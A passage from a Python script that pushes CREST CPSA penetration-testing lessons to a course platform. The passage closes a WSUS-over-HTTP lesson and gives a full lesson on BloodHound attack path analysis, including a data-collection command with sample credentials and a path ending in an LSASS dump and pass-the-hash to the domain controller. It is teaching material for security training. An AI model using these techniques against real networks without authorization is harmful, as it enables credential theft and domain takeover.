> ★ **CREST CPSA:** WSUS over HTTP is a critical misconfiguration because it turns the patching system - the mechanism meant to make hosts more secure - into an attack vector. The WSUS HTTP attack delivers code execution as SYSTEM to every unpatched host that checks in. Always check the WUServer registry value.
"""

E08_MD = """## E-08: BloodHound and Attack Path Analysis

BloodHound uses graph theory to map Active Directory relationships and expose attack paths that are invisible to manual enumeration. It is the single most powerful Active Directory assessment tool available to a penetration tester, and understanding how to use it and interpret its output is a core CPSA skill.

### Why Graph Theory Changes AD Assessment

Active Directory is not a flat list. It is a web of relationships - group memberships, logon sessions, ACL permissions, delegation settings - and those relationships chain together. A user in IT-Helpdesk may have local admin on a workstation. That workstation may have an active Domain Admin session. That Domain Admin may have DCSync rights. No individual link is catastrophic. The chain is.

Manual enumeration finds individual facts. BloodHound finds chains. The difference is the difference between knowing a door is unlocked and knowing the exact route from the car park to the server room through three unlocked doors.

### BloodHound CE - The Modern Stack

BloodHound Community Edition (included in Kali 2025.2+) replaces the legacy neo4j desktop application. It runs as a web application with a significantly improved UI.

```bash
# Start BloodHound CE
sudo bloodhound-ce start

# Access at https://localhost:8080
# Default credentials shown in terminal on first start
```

### Data Collection with bloodhound-python

```bash
# Collect all domain data from Kali - no Windows binary required
bloodhound-python \
  -u jsmith \
  -p Password1 \
  -d syntex.local \
  -ns <DC01-IP> \
  -c All \
  --zip

# Import the .zip into BloodHound CE via the web UI upload button
```

### The Five Queries to Run on Every Engagement

| Query | What It Finds | Why First |
|-------|--------------|-----------|
| Shortest Paths to Domain Admins | Every route from any node to DA, ranked by hops | Shows the full attack surface immediately |
| Find All Domain Admin Sessions | Active DA logon sessions on machines right now | Tells you where to go for credential capture |
| List all Kerberoastable Accounts | Service accounts with SPNs | Offline crack targets |
| Find AS-REP Roastable Users | Accounts with preauth disabled | May work with zero credentials |
| Find Principals with DCSync Rights | Accounts that can dump all AD hashes | Instant game-over if found outside DA group |

### Understanding Edge Types

Every arrow in BloodHound is an action an attacker can take:

- **HasSession** - A privileged user is logged in on this machine. Their credentials are in LSASS memory right now. This is the highest-priority edge operationally.
- **AdminTo** - Local admin rights. Direct code execution via WinRM, WMI, or PsExec.
- **MemberOf** - Group membership. Chains of MemberOf grant inherited privileges.
- **GenericWrite** - Write arbitrary attributes. On a user: set an SPN for Kerberoasting. On a group: add yourself.
- **WriteDACL** - Modify the ACL. Effectively full control - grant yourself any permission.
- **DCSync** - Replicate all AD password hashes. Full domain compromise.

### Reading an Attack Path

```
jsmith --[MemberOf]--> IT-Helpdesk --[AdminTo]--> SYNTEX-WS01
SYNTEX-WS01 --[HasSession]--> ADMINISTRATOR
ADMINISTRATOR --[MemberOf]--> DOMAIN ADMINS
```

Read this as a sequence of actions:
1. jsmith is in IT-Helpdesk - this is a fact, not an action
2. IT-Helpdesk has local admin on SYNTEX-WS01 - authenticate to WS01 with jsmith credentials
3. Administrator has an active session on WS01 - dump LSASS, extract Administrator NT hash
4. Use the NT hash to Pass-the-Hash to the Domain Controller

Four steps. No CVEs. No exploits. Just misconfigurations and trust relationships.

> ★ **CREST CPSA:** "Shortest Paths to Domain Admins" is always the first query. HasSession is always the highest-priority edge - it shows where privileged credentials exist in memory right now, not just in theory. BloodHound does not exploit anything; it maps what is exploitable. The exploitation is your job.
"""


# -------------------------------------------------------
# MAIN
# -------------------------------------------------------

def main():
    print("=== Module E - CourseStack Push v3 ===")
    print(f"Course: {COURSE_ID}")
    print()

    # --- Chapter 1: Theory Lessons ---
    ch1 = create_chapter(
        "Module E - Windows Security Assessment",
        "Theory lessons covering the Windows attack chain - aligned to lab syllabus numbering."
    )
    if not ch1:
        print("FATAL: could not create theory chapter")
        return

    theory_lessons = [
        ("E-01: SMB Enumeration",                              E01_MD),
        ("E-02: Credential Access",                            E02_MD),
        ("E-03: Windows Privilege Escalation",                 E03_MD),
        ("E-03b: ACLs, Registry and File Permissions",         E03B_MD),
        ("E-04a: Active Directory Enumeration",                E04A_MD),
        ("E-04b: Password Policy and Password Spraying",       E04B_MD),
        ("E-05a: Kerberos Attacks",                            E05A_MD),
        ("E-05b: SAM Dump and Cached Credentials",             E05B_MD),
        ("E-06: SQL Server Exploitation",                      E06_MD),
        ("E-07: Patch Assessment and WSUS",                    E07_MD),
        ("E-08: BloodHound and Attack Path Analysis",          E08_MD),
    ]

    for name, md in theory_lessons:
        lid = create_lesson(ch1, name)
        if lid:
            push_content(lid, [make_text(md)])
        time.sleep(0.5)

    # --- Chapter 2: Labs ---
    ch2 = create_chapter(
        "Module E - Labs",
        "Hands-on lab exercises - numbered to match theory lessons."
    )
    if not ch2:
        print("FATAL: could not create labs chapter")
        return

    labs = [
        ("Module E Pre-flight: Engagement Brief and Environment Check", f"{GITHUB}/lab-e0-preflight-v1.html"),
        ("Lab E1-A: SMB Enumeration",                                   f"{GITHUB}/lab-e1a-smb-enumeration-v1.html"),
        ("Lab E2-A: Credential Access",                                  f"{GITHUB}/lab-e2a-credential-access-v1.html"),
        ("Lab E3-A: Windows Privilege Escalation",                       f"{GITHUB}/lab-e3a-windows-privesc-v1.html"),
        ("Lab E3-B: ACLs, Registry and File Permissions",                f"{GITHUB}/lab-e3b-acl-permissions-v1.html"),
        ("Lab E4-A: Active Directory Enumeration",                       f"{GITHUB}/lab-e4a-ad-enumeration-v1.html"),
        ("Lab E4-B: Password Policy and Password Spraying",              f"{GITHUB}/lab-e4b-password-policy-spray-v1.html"),
        ("Lab E5-A: Kerberos Attacks",                                   f"{GITHUB}/lab-e5a-kerberos-attacks-v1.html"),
        ("Lab E5-B: SAM Dump and Cached Domain Credentials",             f"{GITHUB}/lab-e5b-sam-dump-v1.html"),
        ("Lab E6-A: SQL Server Exploitation",                            f"{GITHUB}/lab-e6a-sql-exploitation-v1.html"),
        ("Lab E7-A: Patch Level Assessment and WSUS Review",             f"{GITHUB}/lab-e7a-patch-assessment-v1.html"),
        ("Lab E8-A: BloodHound and Attack Path Analysis",                f"{GITHUB}/lab-e8a-bloodhound-v1.html"),
    ]

    for name, url in labs:
        lid = create_lesson(ch2, name)
        if lid:
            push_content(lid, [make_iframe(url)])
        time.sleep(0.5)

    print()
    print("=== Done ===")
    print()
    print("Lesson/Lab alignment:")
    print("  E-01 theory  ->  Lab E1-A: SMB Enumeration")
    print("  E-02 theory  ->  Lab E2-A: Credential Access")
    print("  E-03 theory  ->  Lab E3-A: Windows PrivEsc")
    print("  E-03b theory ->  Lab E3-B: ACLs and Permissions")
    print("  E-04a theory ->  Lab E4-A: AD Enumeration")
    print("  E-04b theory ->  Lab E4-B: Password Policy")
    print("  E-05a theory ->  Lab E5-A: Kerberos Attacks")
    print("  E-05b theory ->  Lab E5-B: SAM Dump")
    print("  E-06 theory  ->  Lab E6-A: SQL Exploitation")
    print("  E-07 theory  ->  Lab E7-A: Patch Assessment")
    print("  E-08 theory  ->  Lab E8-A: BloodHound")


if __name__ == "__main__":
    main()
